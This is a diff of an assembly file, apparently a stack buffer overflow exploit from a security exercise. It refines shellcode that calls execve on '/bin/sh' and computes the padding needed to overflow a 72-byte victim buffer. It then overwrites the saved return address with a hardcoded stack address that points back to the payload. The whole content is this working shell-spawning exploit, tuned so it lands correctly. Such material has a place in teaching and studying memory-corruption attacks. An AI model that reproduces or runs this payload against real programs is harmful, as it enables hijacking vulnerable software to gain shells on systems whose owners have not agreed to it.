@@ -4,14 +4,16 @@
 
 #include <sys/syscall.h>
 
+#define ADD(X, Y) (X + Y)
 #define buffer_ptr_h 0x7fff
 #define buffer_ptr_l 0xffffdf40
 #define STRING_LEN 7
+#define PAYLOAD_INSTRUCTION_BYTES 61
+#define VICTIM_BUFFER_SIZE 72
+#define PAD_BYTES (VICTIM_BUFFER_SIZE-PAYLOAD_INSTRUCTION_BYTES-STRING_LEN+16)
+
 #define ARG3_OFFSET (STRING_LEN+1)
 #define ARG4_OFFSET (ARG3_OFFSET+8)
-#define PAYLOAD_INSTRUCTION_BYTES 61
-
-#define ADD(X, Y) (X + Y)
 #define EXECVE_SYSCALL 59
 #define EXIT_SYSCALL 60
 
@@ -45,11 +47,6 @@ main:
         syscall                                                         /* invoke syscall */
 
         .ascii  "/bin/sh"
-        .skip   20, 'a'
-        //.ascii  "aaaa"                                                  /* pad to overwrite return address */
-        //.ascii  "bbbb"                                                  /* pad to overwrite return address */
-        //.ascii  "cccc"                                                  /* pad to overwrite return address */
-        //.ascii  "dddd"                                                  /* pad to overwrite return address */
-        //.ascii  "eeee"                                                  /* pad to overwrite return address */
+        .skip   PAD_BYTES, 'a'
         .long   buffer_ptr_l                                            /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
         .long   buffer_ptr_h                                            /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
